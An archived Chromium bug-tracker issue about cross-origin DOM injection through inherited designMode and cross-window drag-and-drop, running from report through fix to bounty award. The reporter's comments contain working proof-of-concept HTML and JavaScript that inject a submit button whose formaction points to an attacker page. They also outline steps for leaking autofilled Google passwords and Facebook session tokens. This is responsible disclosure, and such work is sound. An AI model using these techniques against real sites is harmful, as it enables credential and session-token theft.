# Security: Inherited designMode and cross-window drag-n-drop allow to modify a cross-origin iframe's DOM

| Field | Value |
|-------|-------|
| **Issue ID** | [40081063](https://issues.chromium.org/issues/40081063) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DataTransfer |
| **Reporter** | ar...@rawsec.net |
| **Assignee** | dc...@chromium.org |
| **Created** | 2014-12-23 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

TL;DR: Dragging things to places can lead to a kind of UXSS condition.

Rich-Text mode ("designMode") is inherited by cross-origin iframes, thus allowing to drag DOM elements between windows of different origins. If this action is properly concealed, a user could unwittigly modify the DOM of arbitrary domains to behave in harmful ways.

If you document.designMode = "on", even cross-domain frame children will become editable, but still disallow drag and drop interaction with the parent document. This restriction does not apply to different windows, though. So you can drag an image from a different window or tab into the frame, which will then happily insert the new element into the DOM.  

When dropping HTML elements however, all event properties and script links will be removed, rendering immediate XSS execution impossible, as far as I know.  

But there are equally dangerous payloads, that don't require javascript: For instance, you can drag a button into a form in order to spoof the form target and redirect security tokens to an arbitrary domain.  

Proper use of the X-Frame-Options header does not really diminish the impact here, since almost every "big" website excludes certain pages from embedding restrictions - like Facebook allows sharing buttons to be loaded in iframes.

I included a proof of concept, which roughly outlines a real-life attack to aquire the Facebook session token (fb\_dtsg).  

Instead of scrolling, the user will be tricked into dragging a submit button into a new tab containing a Facebook comment box. The button will overlap the frame and submit the comment form to example.com/evilpage once clicked, which essentially reveals the session token.

This PoC assumes, that you are currently logged in on Facebook and that you allow popups for the current page, although there should be other ways to change the active tab. Furthermore, race conditions might occur, if you release the mouse button before the iframe has loaded or if Facebook changes the form IDs. (If required, I could attempt to further optimize the reliability of the PoC.)

Similar techniques should be possible for most domains, in the best case allowing for attacks equivalent to XSS or CSRF. (Note, how this also allows for escalation through a standard self-XSS issue, which would usually only be exploitable with grotesque social engineering.)

The Facebook PoC: <http://localhost/9b35fda09de66d5f9f4cb8218b735dd2.html>

For reference, feasibility of enforcing drag operations has been discussed here:  

<https://code.google.com/p/chromium/issues/detail?id=59081>

**VERSION**  

Chrome Version: 41.0.2251.0 (Official Build) dev  

Operating System: 3.17.4-1-ARCH x86\_64 GNU/Linux

**REPRODUCTION CASE**

- Create an iframe and load a cross-origin resource, like <https://www.google.com/robots.txt>
- Set document.designMode = "on"
- Drag an element from a different window into the frame. The node should be copied to the frame's DOM.

## Timeline

### ar...@rawsec.net (2014-12-23)

Sorry, the PoC URL is of course:
http://rawsec.net/9b35fda09de66d5f9f4cb8218b735dd2.html

### dc...@chromium.org (2014-12-23)

[Empty comment from Monorail migration]

### wf...@chromium.org (2014-12-24)

[Empty comment from Monorail migration]

### rs...@chromium.org (2014-12-25)

I'm not able to reproduce this. Can you attach a more complete test case for how this would be used by an attacker?

I tried to create a hosting page that contained a <form> tag that could be redirected using the <input type=submit> in the PoC, but I couldn't get that to submit to example.com/evilpage. I also experimented with adding onclick and onload attributes to the PoC's |var content|, but those are stripped during the drag&drop operation.

### rs...@chromium.org (2014-12-25)

That said, the big question is whether designMode should cascade to cross-origin iframes.

### dc...@chromium.org (2014-12-25)

If I understand correctly, the current mitigation blocks cross-origin HTML drags in the same window, but not cross-window right?

This is a debate we had about cross-origin image drags (https://crbug.com/chromium/83112) as well, since it's possible to perform cross-origin theft of an image if we allow cross-origin image drags in the same window. Though image drags (still) aren't implemented today, the compromise we were going to make there is to allow cross-origin drags if it went between windows, since that should be a clear intent on the part of the user to perform a drag and drop gesture.

It seems like similar reasoning would apply here (the user gesture moved between windows, so it should be a clear intent to drag and drop an element).

### ar...@rawsec.net (2014-12-25)

#4, Sorry, that you cannot successfully reprocude the full PoC. Just for my understanding, are you able to reproduce the dragging and dropping of elements into cross-origin iframes in the first place?

As I stated, javascript and event attributes are stripped, but <input> elements allow to overrule the original form "action" attribute and can associate themselves with a form on the current page, even when they do not reside inside the corresponding <form></form> tag, like so:
<input type="submit" form="login" formaction="http://example.com/evilpage">

This is a simplified test case.
[page1.html]:
<div>Drag something from this page to the second page.</div>
<script>
document.addEventListener("dragstart", function() {
    var content = '<input type="submit" form="login" formaction="http://example.com/evilpage">';
    event.dataTransfer.setData('text/html', content);
});
</script>

[page2.html]:
<script> document.designMode="on"; </script>
<form id="login" action="http://google.com/secret">
    <input name="password" value="secrettext">
    <input type="submit" value="Send to Google">
</form>

- Open both page1.html and page2.html in different tabs.
- The form on page2 will, by default, submit to http://google.com/secret.
- Now drag something (parts of the text) from page1 to page2.
- Can you confirm, that a new submit button will be inserted into page2?
- Can you reproduce, that clicking this new submit button will submit the page to http://example.com/evilpage instead of the original form target?

#6, yes, cross-window drags are still allowed, while dragging in the same window is not.
I disagree though, that cross-window drags indicate a clear intention to perform DnD: The initial PoC opens a new tab as soon as you start dragging, which results in unintentionally switching the window during the drag operation - without any additional user interaction. So, from my perception, window-to-window or tab-to-tab drags should be treated in the same way as frame-to-frame drags. Smuggling a frame under the cursor or opening a new tab both achieve the goal of focussing a different document without user interaction.

Additionally, the user will not be aware of what he is dragging, as the actual payload is added via javascript and not the element or text node the user attempts to drag.

### rs...@chromium.org (2014-12-25)

Re #7: Thanks. Yes, I was able to repro datatransfer with cross-origin iframes, but I was not able to repro the form submission. With your more complete testcase in #7, I can now repro what is described in the initial report. For whatever reason, though, if I use the original PoC (9b35fda09de66d5f9f4cb8218b735dd2.html), instead of page2.html, against page1.html, I cannot repro.

I'm labeling this Severity-Medium now, but because this could require a degree of user interaction, it may be Low instead.

dcheng: I'm assigning to you for now because you seem to be the most knowledgable about this. When you discuss cross-window, are you referring exclusively to windows on different origins? It should be fine to permit datatransfer between two windows of the same origin, right?

### ar...@rawsec.net (2014-12-26)

#8: Part of both PoCs is to include the exact ID of the <form> element, which is "u_0_2" in case of Facebook and "login" in case of the second submission. This might be a reason, why you could not reproduce the bug with a modified setup.

For the most common exploit cases I see two required motions, a drag and a click, to inject a submit button and to fire it.
However, imagine a chat application, which submits a form as soon as a text field contains text. In this case you probably require only a single drag to be successful.

To prevent the attack, I would obviously recommend to disallow setting the designMode of cross-origin documents (which is also the default behaviour in Firefox). Besides that, I am not sure if there is a reason why the interaction between two cross-origin windows should necessarily be more permissive than for two cross-origin frames.

### cl...@chromium.org (2014-12-26)

[Empty comment from Monorail migration]

### fe...@chromium.org (2015-01-02)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-01-07)

No more M39 patches, moving to M40.

### in...@chromium.org (2015-01-07)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-16)

dcheng@: Uh oh! This issue is still open and hasn't been updated in the last 21 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-02-06)

dcheng@: Uh oh! This issue is still open and hasn't been updated in the last 42 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-02-20)

[Empty comment from Monorail migration]

### ar...@rawsec.net (2015-02-21)

Let me outline a more straight-forward exploit scenario:

- Load a not XFO-protected page in an iframe, e.g. https://accounts.google.com/o/oauth2/postmessageRelay
- Enable designMode.
- Enforce a copy+paste operation to insert a login form into the cross-origin DOM.
- Make sure the form action points to a domain controlled by the attacker.
- Since the login form now resides on accounts.google.com, password completion is enabled. Chrome fills in any stored credentials, if available.

This way a plaintext password can be revealed without requiring the victim to be logged in (also works in Incognito mode).


This PoC implements the exploit in a pseudo-realistic setting:

http://rawsec.net/80D5FEC40D711CDB81B22F5C689E430C/promo_exploit.html

- Copy one of the "discount codes" and paste it in the first field.
- Enter your GMail account name, which should already be suggested/completed. (Make sure that it is stored in the browser and would be auto-filled at https://accounts.google.com/ServiceLogin?sacu=1)
- Submit the form. The password should have been auto-completed in the background and get disclosed to the server.

This works for me on Google Chrome 42.0.2305.3 + Linux 3.18.6-1-ARCH.

If the exploit fails, please ensure that you are triggering the auto-completion and the setup comes as close as possible to my test case.

Can you reproduce this behavior?

### cl...@chromium.org (2015-02-28)

dcheng@: Uh oh! This issue is still open and hasn't been updated in the last 64 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### ar...@rawsec.net (2015-03-09)

Is there any additional info I can help with in the process of getting this fixed?

By the test case from #17, a simple arbitrary copy+paste movement currently gets my browser-stored Google password disclosed.
I understand that the initial report had a rather fiddly attack scenario; the last example would get me compromised pretty easily, though. So, since the issue is open for over two months, it would be nice to know, if you can reproduce the last exploit or if any details about the bug are still missing.

### am...@chromium.org (2015-03-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-03-21)

dcheng@: Uh oh! This issue is still open and hasn't been updated in the last 85 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### dc...@chromium.org (2015-03-23)

As far as I can tell, designMode doesn't cross iframe boundaries in Firefox. I'll try doing the same for Chrome and hope that no layout tests enforce this behavior (since hopefully that means we can be more flexible on changing this).

### dc...@chromium.org (2015-03-24)

[Empty comment from Monorail migration]

### dc...@chromium.org (2015-03-27)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-03-31)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=192658

------------------------------------------------------------------
r192658 | dcheng@chromium.org | 2015-03-27T08:27:11.365520Z

Changed paths:
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/HTMLElement/iscontenteditable-designmodeon-allinherit-subframe-expected.txt?r1=192658&r2=192657&pathrev=192658
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.h?r1=192658&r2=192657&pathrev=192658
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.idl?r1=192658&r2=192657&pathrev=192658
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/HTMLElement/iscontenteditable-designmodeon-allinherit-subframe.html?r1=192658&r2=192657&pathrev=192658
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/HTMLElement/iscontenteditable-designmodeon-subframe-expected.txt?r1=192658&r2=192657&pathrev=192658
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/frame/UseCounter.h?r1=192658&r2=192657&pathrev=192658
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.cpp?r1=192658&r2=192657&pathrev=192658
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/HTMLElement/iscontenteditable-designmodeon-subframe.html?r1=192658&r2=192657&pathrev=192658

Remove inheritance of designMode attribute.

This matches the behavior of IE and Firefox, and conveniently removes a
problematic bit of code for OOPI.

BUG=444927

Review URL: https://codereview.chromium.org/1031543003
-----------------------------------------------------------------

### cl...@chromium.org (2015-04-03)

[Empty comment from Monorail migration]

### ti...@google.com (2015-04-08)

@dcheng - can this be marked as fixed or is there more work to do here?

### dc...@chromium.org (2015-04-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-04-08)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ti...@google.com (2015-04-09)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-08)

Merge requested for M43 (branch 2357)

### la...@google.com (2015-05-08)

[Automated comment] Less than 2 weeks to go before stable on M43, manual review required.

### la...@google.com (2015-05-11)

[Empty comment from Monorail migration]

### dc...@chromium.org (2015-05-12)

I don't think a merge is needed here? The CL in question landed in Blink r192658, and M43 branched at 193137.

### la...@google.com (2015-05-12)

Good call, removing the Merge-Approved label, since this is a no action required.

### ti...@google.com (2015-05-12)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-18)

[Empty comment from Monorail migration]

### ti...@google.com (2015-05-19)

Congratulations - our reward panel decided on $3,000 for your report!

Reward panel notes: "Great example provided at #17, high grade info leak - thanks for the great report".

Someone from our finance area should be in contact within two weeks to collect payment details. 

How would you like to be credited in our release notes? We'll go with "Credit to armin@rawsec.net" unless you tell us otherwise. 

I'll update this issue with a CVE shortly so that you can refer to that.

Any questions, either update this issue or contact me directly at timwillis@

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************


### ar...@rawsec.net (2015-05-20)

Thanks a lot!

If not too late I would like to be credited as "Armin Razmdjou".

### ti...@google.com (2015-05-20)

Updated - http://googlechromereleases.blogspot.com/2015/05/stable-channel-update_19.html.

Thanks again!

### ti...@google.com (2015-06-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-07-15)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-07-24)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/444927?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/469978]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081063)*
